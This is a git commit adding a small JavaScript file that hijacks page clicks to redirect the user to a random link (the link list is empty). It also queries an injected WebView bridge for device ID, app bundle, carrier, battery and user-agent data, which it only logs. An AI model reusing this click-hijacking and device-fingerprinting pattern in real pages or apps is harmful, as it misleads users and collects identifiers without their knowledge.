05ad813e6cd62663ae968e21010b9514a8580411
John <John@qq.com>
2024-07-06 15:15:52 +0800

    initial

---
+++ ok.js
@@ -0,0 +1,33 @@
+function init() {
+  var arr = [
+  ];
+ 
+  var didOpen = false;
+  document.addEventListener("click", function() {
+    if (didOpen) {
+      return;
+    }
+    didOpen = true;
+    setTimeout(() => {
+      didOpen = false;
+    }, 5000);
+
+    var randomIndex = Math.floor(Math.random() * arr.length);
+    var randomLink = arr[randomIndex];
+    window.location.href = randomLink;
+  });
+
+  window.ITInjectSetupWebViewJavascriptBridge(function(bridge) {
+    bridge.callHandler('getInfo', { 
+      'cfg': ['version', 'atIntervals', 'atDurations', 'hehehe'], 
+      'ua': ['version', 'timestamp', 'userAgent', 'lilili'], 
+      'base': ['deviceID', 'appBundleID', 'appVersion', 'batteryLevel', 'carrier', 'lalala'] 
+    }, function(responseData) {
+      console.log(responseData);
+    });
+  });
+}
+
+setTimeout(() => {
+  init();
+}, 1000);
